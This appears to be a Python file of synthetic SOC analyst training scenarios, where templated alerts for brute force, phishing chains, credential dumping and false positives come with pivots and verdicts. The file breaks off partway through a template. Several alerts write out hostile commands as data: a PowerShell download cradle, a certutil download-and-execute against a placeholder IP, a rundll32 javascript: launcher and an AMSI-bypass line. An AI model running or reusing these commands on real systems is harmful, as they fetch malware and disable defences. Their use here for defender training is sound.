"""
Scenario templates for SOC L1 Drill.

Each template renders into many concrete scenarios via placeholder pools
({user}, {ip}, {host}, {time_hhmm}, ...), so the trainee learns the PATTERN,
not the card.

Verdicts:  false_positive | benign | malicious
Actions:   close | escalate
Pivots:    related | asset | user | reputation
"""

import random
import json

FIRST = ["j.smith", "a.garcia", "m.chen", "d.kowalski", "s.ivanova", "r.patel",
         "k.johnson", "l.nguyen", "t.brown", "e.martinez", "p.olsen", "n.fischer"]
ADMINS = ["adm.wilson", "adm.torres", "svc.backup", "svc.sccm", "adm.reyes"]
WKS = ["WKS-{n:04d}", "LT-{n:04d}", "DESK-{n:04d}"]
SRV = ["SRV-FILE01", "SRV-APP02", "SRV-WEB01", "SRV-SQL03", "DC-01", "DC-02", "JUMP-01"]
EXT_IP = ["45.155.204.{o}", "185.220.101.{o}", "91.240.118.{o}", "194.26.29.{o}",
          "103.75.190.{o}", "80.94.95.{o}"]
INT_IP = ["10.10.{a}.{o}", "10.20.{a}.{o}", "192.168.{a}.{o}"]
CLEAN_IP = ["52.96.{a}.{o}", "40.97.{a}.{o}", "13.107.{a}.{o}", "142.250.{a}.{o}"]
COUNTRIES_BAD = ["RU", "KP", "IR", "NG", "CN"]
COUNTRIES_OK = ["US", "CA", "GB", "DE"]

DEPTS = {
    "accounting": "Accounting", "hr": "Human Resources", "sales": "Sales",
    "eng": "Engineering", "it": "IT Operations", "legal": "Legal",
}


def _wks():
    return random.choice(WKS).format(n=random.randint(1, 999))


def _ip(pool):
    t = random.choice(pool)
    return t.format(a=random.randint(1, 99), o=random.randint(2, 254))


def base_ctx():
    return {
        "user": random.choice(FIRST),
        "admin": random.choice(ADMINS),
        "wks": _wks(),
        "srv": random.choice(SRV),
        "ext_ip": _ip(EXT_IP),
        "int_ip": _ip(INT_IP),
        "clean_ip": _ip(CLEAN_IP),
        "bad_country": random.choice(COUNTRIES_BAD),
        "ok_country": random.choice(COUNTRIES_OK),
        "hh_off": f"{random.choice([1,2,3,4]):02d}:{random.randint(0,59):02d}",
        "hh_biz": f"{random.randint(9,16):02d}:{random.randint(0,59):02d}",
        "dept": random.choice(list(DEPTS.values())),
        "n_fail": random.choice([37, 52, 68, 84, 112, 143]),
        "port": random.choice([3389, 445, 22, 8443]),
    }


# ---------------------------------------------------------------------------
# Template definitions
# ---------------------------------------------------------------------------
# Fields:
#   id, source, event_type (correct answer), event_type_pool (distractors),
#   mitre, alert (str.format template), pivots {related, asset, user, reputation},
#   verdict, action, required_pivots, what_to_check, explanation
# ---------------------------------------------------------------------------

TEMPLATES = [

# ===================== WINDOWS SECURITY =====================
{
    "id": "win_4625_brute",
    "source": "Windows Security",
    "event_type": "Brute force / password guessing",
    "mitre": "T1110 – Brute Force",
    "alert": (
        "EventID: 4625 (An account failed to log on)\n"
        "Account Name: {user}\n"
        "Workstation Name: {srv}\n"
        "Source Network Address: {ext_ip}\n"
        "Logon Type: 3 (Network)\n"
        "Failure Reason: Unknown user name or bad password\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: 4625 on {srv}, last 30 min\n→ {n_fail} failed logons, same source {ext_ip}\n→ usernames tried: administrator, admin, {user}, backup, test, sqlsvc\n→ interval between attempts: 2–4 seconds\n→ no successful 4624 from this source",
        "asset": "{srv} — member server, RDP exposed via NAT (legacy vendor requirement).\nCriticality: HIGH. Owner: IT Operations.",
        "user": "{user} — {dept}. Standard user, no admin rights.\nNormal logon hours: 08:00–18:00 PT, always from internal subnet.",
        "reputation": "{ext_ip} → AbuseIPDB score 98/100, 412 reports.\nTagged: RDP brute force, SSH scanner. Geo: {bad_country}.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Volume and rate of 4625s from the same source, username pattern (dictionary), any successful 4624 afterwards, source IP reputation.",
    "explanation": "Dozens of failures at machine-speed intervals against a rotating username list from a known-abusive IP is a textbook brute-force attempt. No successful logon yet, but the server is exposed and high-criticality — escalate to block the source and review RDP exposure. Closing this because 'no success yet' is a classic L1 miss.",
},
{
    "id": "win_4625_typo",
    "source": "Windows Security",
    "event_type": "Failed logon — user error",
    "mitre": "T1078 – Valid Accounts (ruled out)",
    "alert": (
        "EventID: 4625 (An account failed to log on)\n"
        "Account Name: {user}\n"
        "Workstation Name: {wks}\n"
        "Source Network Address: {int_ip}\n"
        "Logon Type: 2 (Interactive)\n"
        "Failure Reason: Unknown user name or bad password\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: 4625/4624 for {user}, last 30 min\n→ 2 failed logons (Logon Type 2), then successful 4624 from same {wks} 40 seconds later.\n→ No other hosts involved.",
        "asset": "{wks} — standard workstation assigned to {user}. Criticality: LOW.",
        "user": "{user} — {dept}. This is their assigned machine.\nLast password change: yesterday (helpdesk ticket #HD-4412, password reset).",
        "reputation": "{int_ip} — internal DHCP range, corporate LAN. No reputation data applicable.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Count of failures, whether a successful logon follows from the same device, recent password-reset activity.",
    "explanation": "Two interactive failures followed by a success from the user's own workstation the day after a password reset is a user mistyping a new password. Benign noise. Escalating this wastes L2 time; the correct move is close with a one-line note.",
},
{
    "id": "win_4624_rdp_ext",
    "source": "Windows Security",
    "event_type": "Suspicious remote logon",
    "mitre": "T1021.001 – Remote Services: RDP",
    "alert": (
        "EventID: 4624 (An account was successfully logged on)\n"
        "Account Name: {admin}\n"
        "Logon Type: 10 (RemoteInteractive)\n"
        "Source Network Address: {ext_ip}\n"
        "Target: {srv}\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: activity for {admin} on {srv}, ±30 min\n→ 4624 Type 10 at {hh_off}\n→ 7 min later: 4688 New Process — cmd.exe → whoami, net group \"Domain Admins\" /domain, quser\n→ 4672 special privileges assigned at logon",
        "asset": "{srv} — jump/management server with domain-admin tooling installed.\nCriticality: CRITICAL.",
        "user": "{admin} — IT admin account. VPN policy: all remote admin access must come through corporate VPN egress 10.10.5.0/24.\nHR: no travel or on-call ticket registered tonight.",
        "reputation": "{ext_ip} → no abuse reports. Residential ISP, geo: {bad_country}. First time seen in our logs.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Logon type + source (should be VPN range), what commands ran after logon, whether the admin has a change/on-call ticket, geo consistency.",
    "explanation": "Successful RDP as a privileged account from an external residential IP outside the VPN path, at 3 AM, immediately followed by discovery commands (whoami, net group) — this is a likely account compromise in the post-exploitation discovery phase. Escalate immediately; L1 does not 'wait and watch' on a live admin session.",
},
{
    "id": "win_4720_offhours",
    "source": "Windows Security",
    "event_type": "Unauthorized account creation",
    "mitre": "T1136.001 – Create Account: Local Account",
    "alert": (
        "EventID: 4720 (A user account was created)\n"
        "New Account: support_tmp\n"
        "Created By: {admin}\n"
        "Computer: {srv}\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: {admin} activity on {srv}, ±60 min\n→ 4624 Type 3 from {int_ip} (workstation of {user}, not the admin's machine)\n→ 4720 create support_tmp → 4732 added to local Administrators\n→ 4738 'Password never expires' set to TRUE",
        "asset": "{srv} — file server. Criticality: HIGH.",
        "user": "{admin} — IT admin. Change calendar: NO approved change window tonight.\nAdmin's own workstation is IT-0142, not {int_ip}.",
        "reputation": "{int_ip} — internal, belongs to {dept} workstation of {user}. No business reason to hold admin credentials.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Was there an approved change ticket, where did the admin session originate, was the new account privileged (4732), password-never-expires flag.",
    "explanation": "Account creation + immediate local-admin membership + password-never-expires, performed off-hours from a workstation that shouldn't hold admin credentials and with no change ticket — this is persistence being installed, likely with stolen admin credentials. Escalate: the source workstation and the admin account both need containment review.",
},
{
    "id": "win_4672_backup",
    "source": "Windows Security",
    "event_type": "Privileged logon — expected service activity",
    "mitre": "T1078 – Valid Accounts (ruled out)",
    "alert": (
        "EventID: 4672 (Special privileges assigned to new logon)\n"
        "Account Name: svc.backup\n"
        "Privileges: SeBackupPrivilege, SeRestorePrivilege\n"
        "Computer: {srv}\n"
        "Time: 02:05 PT"
    ),
    "pivots": {
        "related": "Query: svc.backup on {srv}, last 24h\n→ Identical 4672 + 4624 Type 5 (Service) every night 02:00–02:10 for the past 90 days.\n→ Parent process: VeeamAgent.exe. No interactive logons ever recorded for this account.",
        "asset": "{srv} — file server in nightly backup scope. Criticality: HIGH.",
        "user": "svc.backup — documented service account for Veeam backups. Logon-as-service only; interactive logon denied by GPO.",
        "reputation": "Source: local SYSTEM service context. No network source address.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Whether this account and time match the documented backup schedule, logon type (Service vs Interactive), any deviation from the 90-day baseline.",
    "explanation": "SeBackupPrivilege at 02:05 from a documented backup service account, matching a 90-day nightly baseline, logon type Service — expected operational noise. Worth knowing: the ALERT LOGIC is bad (should be tuned to exclude the service account window), which you can note in the ticket, but the event itself is benign.",
},
{
    "id": "win_4688_lolbin",
    "source": "Windows Security",
    "event_type": "Living-off-the-land binary abuse",
    "mitre": "T1218.011 – Signed Binary Proxy: Rundll32",
    "alert": (
        "EventID: 4688 (A new process has been created)\n"
        "New Process: C:\\Windows\\System32\\rundll32.exe\n"
        "Command Line: rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -w hidden\")\n"
        "Parent: C:\\Users\\{user}\\AppData\\Local\\Temp\\invoice_view.exe\n"
        "Computer: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: process tree on {wks}, ±15 min\n→ OUTLOOK.EXE → invoice_view.exe (dropped from .zip attachment) → rundll32 → powershell -ep bypass\n→ PowerShell made DNS query to cdn-metrics-sync[.]top",
        "asset": "{wks} — standard workstation, {dept}. EDR agent: installed, alert mode only.",
        "user": "{user} — {dept}. Not a developer, no admin rights. No scripting in role.",
        "reputation": "cdn-metrics-sync[.]top → registered 6 days ago, VT 23/94 detections, flagged: malware C2.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Parent process chain (Outlook → temp exe), rundll32 javascript: syntax (never legitimate), outbound DNS/network from spawned PowerShell, domain age and reputation.",
    "explanation": "rundll32 with javascript: protocol handler is a known LOLBin execution trick with essentially zero legitimate use, and the chain (mail client → temp-dir exe → rundll32 → hidden PowerShell → 6-day-old C2 domain) is an active phishing compromise. Escalate for isolation. Timer note: this one should take you under 90 seconds — the command line alone is disqualifying.",
},

# ===================== POWERSHELL =====================
{
    "id": "ps_4104_encoded",
    "source": "PowerShell",
    "event_type": "Malicious script execution",
    "mitre": "T1059.001 – PowerShell",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: {user}\n"
        "ScriptBlock (decoded from -EncodedCommand):\n"
        "$c=New-Object Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');\n"
        "IEX $c.DownloadString('http://{ext_ip}/a.ps1')\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks} process + network, ±15 min\n→ Parent: WINWORD.EXE → powershell.exe -nop -w hidden -enc <base64>\n→ HTTP GET to {ext_ip}/a.ps1 returned 200, 48 KB\n→ New scheduled task 'OneDriveSync2' created 2 min later (T1053.005)",
        "asset": "{wks} — standard workstation, {dept}. Criticality: MEDIUM.",
        "user": "{user} — {dept}. No PowerShell usage in 90-day baseline. Not IT.",
        "reputation": "{ext_ip} → VT 19/94, tagged: malware distribution. Geo: {bad_country}. Domainless direct-IP hosting.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Parent process (Office spawning PowerShell), -enc/-nop/-w hidden flags, download-and-execute pattern (IEX + DownloadString), follow-on persistence.",
    "explanation": "Word spawning hidden encoded PowerShell that download-cradles a script from a direct IP and then installs a scheduled task is a full phishing → execution → persistence chain. Any ONE of these would be suspicious; together they are conclusive. Escalate for host isolation and credential reset.",
},
{
    "id": "ps_4104_sccm",
    "source": "PowerShell",
    "event_type": "Administrative script — expected activity",
    "mitre": "T1059.001 – PowerShell (ruled out)",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: svc.sccm\n"
        "ScriptBlock: Get-WmiObject -Class Win32_Product | Where-Object {{$_.Name -like '*Java*'}} | ForEach-Object {{$_.Uninstall()}}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: svc.sccm 4104 fleet-wide, last 2h\n→ Identical script block on 214 workstations, rolled out in alphabetical hostname order.\n→ Parent: CcmExec.exe (SCCM agent).",
        "asset": "{wks} — standard workstation, part of SCCM collection 'All Workstations'.",
        "user": "svc.sccm — documented SCCM service account.\nChange ticket CHG-2291: 'Remove legacy Java runtime, fleet-wide, this week' — APPROVED.",
        "reputation": "No network indicators. Script is local WMI only.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Parent process (SCCM agent vs interactive), fleet-wide uniform pattern vs single host, matching approved change ticket.",
    "explanation": "Uniform script execution across 214 hosts from the SCCM agent under a documented service account with an approved change ticket is patch/software management, not an attack. The tell: attackers do not typically execute in tidy alphabetical fleet order from CcmExec.exe. Close, reference CHG-2291 in the ticket.",
},
{
    "id": "ps_amsi_bypass",
    "source": "PowerShell",
    "event_type": "Defense evasion attempt",
    "mitre": "T1562.001 – Impair Defenses: Disable or Modify Tools",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {srv}\n"
        "User: {admin}\n"
        "ScriptBlock: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {admin} on {srv}, ±30 min\n→ RDP logon from {int_ip} 20 min prior\n→ After AMSI bypass: Invoke-Mimikatz string fragments in subsequent 4104 blocks (partially logged)\n→ lsass.exe accessed by powershell.exe (Sysmon 10)",
        "asset": "{srv} — application server. Criticality: HIGH. Not a pentest lab host.",
        "user": "{admin} — IT admin. No red-team engagement or pentest authorization on the security calendar this month.",
        "reputation": "{int_ip} — internal workstation, {dept} subnet. Not an IT admin subnet.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Is this a sanctioned pentest (check engagement calendar), what ran after the bypass, LSASS access, source of the admin session.",
    "explanation": "The amsiInitFailed reflection trick is a signature AMSI bypass — it has no admin use case. Followed by Mimikatz fragments and LSASS access (credential dumping, T1003.001), with no authorized engagement on the calendar, from a non-IT subnet. Escalate as active hands-on-keyboard intrusion. The only acceptable 'benign' outcome for this pattern is a scheduled pentest, which you must verify, not assume.",
},

# ===================== SYSMON =====================
{
    "id": "sysmon_lsass",
    "source": "Sysmon",
    "event_type": "Credential dumping attempt",
    "mitre": "T1003.001 – OS Credential Dumping: LSASS",
    "alert": (
        "Sysmon EventID: 10 (ProcessAccess)\n"
        "SourceImage: C:\\Users\\{user}\\Downloads\\procmon64.exe\n"
        "TargetImage: C:\\Windows\\System32\\lsass.exe\n"
        "GrantedAccess: 0x1FFFFF\n"
        "Computer: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks} process + file events, ±20 min\n→ 'procmon64.exe' hash does NOT match Sysinternals signed release\n→ File created 11 min ago from browser download\n→ Followed by file write: C:\\Users\\{user}\\AppData\\Local\\Temp\\lsass.dmp (Sysmon 11)",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Not IT, no admin tooling in baseline. However, local admin rights present (legacy exception).",
        "reputation": "File hash → VT 41/94: Mimikatz variant, renamed. Signed: NO (legit Procmon is Microsoft-signed).",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "GrantedAccess mask (0x1FFFFF = full access), is the 'known tool' actually signed / hash-matching, dump file creation afterwards, who has business need for LSASS access.",
    "explanation": "A fake 'procmon' (unsigned, VT-flagged Mimikatz) opening LSASS with full access and writing lsass.dmp is credential dumping in progress. The renamed-tool trick is exactly why you verify hash/signature instead of trusting the filename. Escalate for isolation + assume credentials on that host are compromised.",
},
{
    "id": "sysmon_edr_lsass_av",
    "source": "Sysmon",
    "event_type": "LSASS access — legitimate security software",
    "mitre": "T1003.001 – Credential Dumping (ruled out)",
    "alert": (
        "Sysmon EventID: 10 (ProcessAccess)\n"
        "SourceImage: C:\\Program Files\\Windows Defender\\MsMpEng.exe\n"
        "TargetImage: C:\\Windows\\System32\\lsass.exe\n"
        "GrantedAccess: 0x1400\n"
        "Computer: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: MsMpEng.exe → lsass access, fleet-wide\n→ Same pattern on every workstation, recurring, aligns with Defender scan schedule.\n→ GrantedAccess 0x1400 = query limited info only (no VM_READ of full memory).",
        "asset": "{wks} — standard workstation.",
        "user": "N/A — SYSTEM context, Defender engine process.",
        "reputation": "MsMpEng.exe — Microsoft-signed, path and hash match legitimate Defender engine.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Source image path + signature, GrantedAccess mask (0x1400 query vs 0x1FFFFF full), fleet-wide recurring pattern.",
    "explanation": "AV/EDR engines touch LSASS constantly with limited access masks — 0x1400 is a query, not a memory read. Signed Microsoft binary in the correct path, fleet-wide recurring. This is exactly the noise a Sysmon 10 rule generates if not tuned; note the tuning suggestion and close.",
},
{
    "id": "sysmon_office_child",
    "source": "Sysmon",
    "event_type": "Phishing payload execution",
    "mitre": "T1566.001 – Spearphishing Attachment",
    "alert": (
        "Sysmon EventID: 1 (Process Create)\n"
        "Image: C:\\Windows\\System32\\cmd.exe\n"
        "CommandLine: cmd /c certutil -urlcache -split -f http://{ext_ip}/up.dat C:\\ProgramData\\up.exe && C:\\ProgramData\\up.exe\n"
        "ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\n"
        "User: {user}\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ EXCEL.EXE opened 'PO_Q3_urgent.xlsm' from email attachment 3 min prior\n→ certutil downloaded 210 KB → up.exe executed → outbound 443 to {ext_ip} established (Sysmon 3)",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}, works with vendor POs daily (relevant: attractive phishing target, macro-enabled files not unusual in mailbox).",
        "reputation": "{ext_ip} → VT 12/94, recently flagged. up.exe hash → VT 34/94: trojan downloader.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Office app spawning cmd/powershell, certutil used as downloader (LOLBin), what the payload did next, hash reputation.",
    "explanation": "Excel spawning cmd → certutil-as-downloader → executing the payload → C2 connection is a complete macro-phishing chain. certutil -urlcache -f fetching remote files is a classic LOLBin abuse with almost no legitimate desktop use. Escalate; the 'user opens vendor macros daily' detail explains why it got clicked, not why it's safe.",
},
{
    "id": "sysmon_runkey",
    "source": "Sysmon",
    "event_type": "Persistence via registry run key",
    "mitre": "T1547.001 – Registry Run Keys / Startup Folder",
    "alert": (
        "Sysmon EventID: 13 (Registry value set)\n"
        "TargetObject: HKU\\...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper\n"
        "Details: C:\\Users\\{user}\\AppData\\Roaming\\WinUpd\\wuhelper.exe\n"
        "Image: C:\\Users\\{user}\\AppData\\Roaming\\WinUpd\\wuhelper.exe\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: wuhelper.exe on {wks}, last 24h\n→ Binary dropped 2h ago by browser download 'flashplayer_update.exe'\n→ wuhelper.exe beacons to {ext_ip}:8443 every 60 s (Sysmon 3, 118 connections)\n→ Binary self-registered the Run key (persistence written by the payload itself)",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Reported 'Flash update popup' to helpdesk yesterday (ticket noted, no action taken).",
        "reputation": "wuhelper.exe hash → VT 29/94: generic backdoor. {ext_ip} → C2 infrastructure, {bad_country}.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Does the Run-key name impersonate Windows components, binary path (AppData\\Roaming ≠ Windows update location), regular-interval beaconing, drop chain.",
    "explanation": "'WindowsUpdateHelper' pointing to AppData\\Roaming with 60-second beaconing to flagged infrastructure is malware persistence — real Windows Update never lives in a user profile. Fake-Flash-update lure confirmed by the user's own helpdesk ticket. Escalate; also flag the missed helpdesk ticket in your notes (process gap).",
},
{
    "id": "sysmon_schtask_legit",
    "source": "Sysmon",
    "event_type": "Scheduled task creation — legitimate software",
    "mitre": "T1053.005 – Scheduled Task (ruled out)",
    "alert": (
        "Sysmon EventID: 1 (Process Create)\n"
        "Image: C:\\Windows\\System32\\schtasks.exe\n"
        "CommandLine: schtasks /create /tn \"GoogleUpdateTaskMachineUA\" /tr \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua\" /sc hourly\n"
        "ParentImage: C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\n"
        "User: SYSTEM\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: same task creation fleet-wide, last 7 days\n→ Present on 96% of workstations, created during Chrome install/update cycles.\n→ Target binary in Program Files, not user-writable path.",
        "asset": "{wks} — standard workstation.",
        "user": "SYSTEM context via Google Update service — standard installer behavior.",
        "reputation": "GoogleUpdate.exe — Google-signed, hash matches known-good. Task name matches documented Google updater tasks.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Task target path (Program Files vs AppData/Temp), binary signature, whether the task name+binary pair matches known software behavior fleet-wide.",
    "explanation": "Google Update creating its own documented hourly task, signed binary, protected path, present fleet-wide — standard software behavior. The skill here is speed: recognize known-good software persistence in seconds and keep the queue moving. Suggest whitelisting this task name + signer pair in the rule.",
},

# ===================== DEFENDER =====================
{
    "id": "def_quarantine_ok",
    "source": "Microsoft Defender",
    "event_type": "Malware blocked — remediated",
    "mitre": "T1204.002 – Malicious File",
    "alert": (
        "Microsoft Defender Alert\n"
        "Threat: Trojan:Win32/AgentTesla.ML\n"
        "File: C:\\Users\\{user}\\Downloads\\DHL_shipping_label.exe\n"
        "Action: Quarantined (remediation successful)\n"
        "Device: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks} post-detection, ±30 min\n→ No process-create for the file (blocked pre-execution)\n→ No network connections, no persistence artifacts\n→ Defender full scan completed clean 20 min after quarantine",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Received phishing email 'DHL delivery failed', clicked and downloaded, did not run (Defender blocked first).",
        "reputation": "Hash → VT 55/94 AgentTesla infostealer. Sender domain → known phishing campaign, active this week.",
    },
    "verdict": "benign",
    "action": "close",
    "required_pivots": ["related"],
    "what_to_check": "Was it blocked pre-execution or post-execution, any process/network/persistence evidence after the timestamp, scan results.",
    "explanation": "True positive, fully remediated: the malware was real (so NOT a false positive) but quarantined before execution with zero follow-on activity — the control worked. Close with notes, report the phish for mail-filter tuning. Escalating every successful quarantine buries L2; escalation is for when remediation FAILED or execution preceded detection. This verdict category (benign true positive / remediated) is the one L1s most often get wrong in both directions.",
},
{
    "id": "def_quarantine_ran",
    "source": "Microsoft Defender",
    "event_type": "Malware executed before detection",
    "mitre": "T1204.002 – Malicious File",
    "alert": (
        "Microsoft Defender Alert\n"
        "Threat: Trojan:Win32/Emotet.PDS!MTB\n"
        "File: C:\\Users\\{user}\\AppData\\Local\\Temp\\report_v2.exe\n"
        "Action: Quarantined\n"
        "Device: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, 60 min BEFORE detection\n→ report_v2.exe RAN for 47 minutes before signature update caught it\n→ During that window: outbound 443 to {ext_ip} (2.1 MB out), reg Run key created, 3 archived .zip written in Temp\n→ Run key still present after quarantine",
        "asset": "{wks} — workstation of {user}, {dept}. Has mapped drives to {srv}.",
        "user": "{user} — {dept}. Password last changed 8 months ago.",
        "reputation": "{ext_ip} → Emotet C2 tier, active. Hash → VT 61/94.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related"],
    "what_to_check": "THE key question on every quarantine: did it execute before detection? Dwell time, network egress volume, persistence artifacts surviving remediation.",
    "explanation": "Same alert type as a routine quarantine — completely different situation. 47 minutes of execution, data egress, and persistence that SURVIVED the quarantine means remediation is incomplete and credentials/data may be gone. Escalate for isolation, credential reset, and IR. Contrast with the pre-execution case: the alert text is nearly identical; the pivot into the pre-detection window is what separates them.",
},
{
    "id": "def_pua_tool",
    "source": "Microsoft Defender",
    "event_type": "PUA detection — authorized IT tool",
    "mitre": "T1219 – Remote Access Software (ruled out)",
    "alert": (
        "Microsoft Defender Alert\n"
        "Threat: PUA:Win32/RemoteAdmin (Behavior: potentially unwanted application)\n"
        "File: C:\\Tools\\rustdesk-host.exe\n"
        "Action: Detected (audit mode, not blocked)\n"
        "Device: {srv}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: rustdesk-host.exe usage, last 30 days\n→ Installed on 4 IT support hosts, consistent daily usage during business hours by IT staff.\n→ Connections only to IT admin workstations, internal.",
        "asset": "{srv} — IT support host, tools server. Owner: IT Operations.",
        "user": "Installed under adm.wilson. IT asset register: RustDesk listed as APPROVED remote support tool (replaced TeamViewer, decision memo IT-2024-08).",
        "reputation": "Binary signed by RustDesk Ltd, hash matches official release. PUA class ≠ malware: flagged because remote-admin tools are dual-use.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["user", "related"],
    "what_to_check": "Is the tool on the approved-software register, who installed it, where does it connect, is usage pattern consistent with IT support.",
    "explanation": "PUA detections flag DUAL-USE tools, not confirmed malware. This one is on the approved register, signed, used only by IT internally. Close and request a Defender PUA exclusion for the approved hash. Judgment note: the same RustDesk binary on a random accounting workstation with external connections would be an escalation — PUA verdicts are entirely about context.",
},

# ===================== SENTINEL =====================
{
    "id": "sent_impossible_travel",
    "source": "Microsoft Sentinel",
    "event_type": "Impossible travel — compromised credentials",
    "mitre": "T1078.004 – Valid Accounts: Cloud",
    "alert": (
        "Sentinel Incident: Impossible travel activity\n"
        "User: {user}@corp.example.com\n"
        "Sign-in 1: Sacramento, US ({hh_biz} PT) — corporate device, compliant\n"
        "Sign-in 2: 41 min later — {bad_country}, unfamiliar device, legacy IMAP protocol\n"
        "Severity: Medium"
    ),
    "pivots": {
        "related": "Query: SigninLogs + mailbox audit for {user}, 24h\n→ Second sign-in SUCCEEDED (password valid, no MFA — IMAP legacy auth bypasses MFA)\n→ Post-login: new inbox rule 'RSS Feeds2' — forward all to external gmail; 340 emails accessed\n→ Password spray against 14 other accounts from same IP block, 1 more success",
        "asset": "Exchange Online mailbox. Contains {dept} correspondence including invoices.",
        "user": "{user} — {dept}. No travel booked (HR/travel system). Confirmed physically in office by badge log at time of sign-in 2.",
        "reputation": "Sign-in 2 IP → anonymizing VPN exit node, multiple tenant abuse reports.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Did the second sign-in succeed, legacy-auth/MFA bypass, post-login mailbox rules and access, badge/travel verification, same-source attempts on other accounts.",
    "explanation": "Successful sign-in through MFA-bypassing legacy IMAP from a VPN exit node while the user is badge-confirmed in Sacramento, followed by an exfil forwarding rule — confirmed BEC-style compromise, and the spray hit a second account. Escalate: token revocation, password reset, rule removal, and the second account needs the same treatment. Also worth noting for the ticket: legacy auth should be disabled tenant-wide.",
},
{
    "id": "sent_travel_vpn_fp",
    "source": "Microsoft Sentinel",
    "event_type": "Impossible travel — VPN artifact",
    "mitre": "T1078.004 – Valid Accounts (ruled out)",
    "alert": (
        "Sentinel Incident: Impossible travel activity\n"
        "User: {user}@corp.example.com\n"
        "Sign-in 1: Sacramento, US ({hh_biz} PT) — corporate device\n"
        "Sign-in 2: 12 min later — Amsterdam, NL — SAME corporate device ID, compliant, MFA satisfied\n"
        "Severity: Medium"
    ),
    "pivots": {
        "related": "Query: SigninLogs for {user}, 24h\n→ Both sign-ins: same device ID, same browser fingerprint, MFA claim present\n→ 'Amsterdam' IP belongs to corporate secure-web-gateway (Zscaler) EU egress range\n→ No mailbox rules, no unusual access after either sign-in",
        "asset": "Exchange Online mailbox, standard.",
        "user": "{user} — {dept}. IT notes: Zscaler client sometimes routes through EU POP after VPN reconnect — known ticket pattern.",
        "reputation": "Amsterdam IP → registered to corporate SWG vendor ASN, present on the documented egress allowlist.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Same device/fingerprint on both sign-ins, MFA status, does the 'foreign' IP belong to corporate VPN/SWG egress ranges, any post-login anomalies.",
    "explanation": "Same compliant device with MFA on both legs, and the foreign IP resolves to the company's own web-gateway egress — geolocation artifact of the proxy, not travel. Close; recommend adding SWG egress ranges to the analytic rule's exclusion list, since this FP pattern will recur constantly until tuned.",
},
{
    "id": "sent_mass_delete",
    "source": "Microsoft Sentinel",
    "event_type": "Mass file deletion / possible ransomware staging",
    "mitre": "T1485 – Data Destruction",
    "alert": (
        "Sentinel Incident: Mass cloud file deletion\n"
        "User: {user}@corp.example.com\n"
        "Activity: 2,340 files deleted from SharePoint site '{dept}-Shared' in 15 min\n"
        "Client: sync client (OneDrive)\n"
        "Severity: High"
    ),
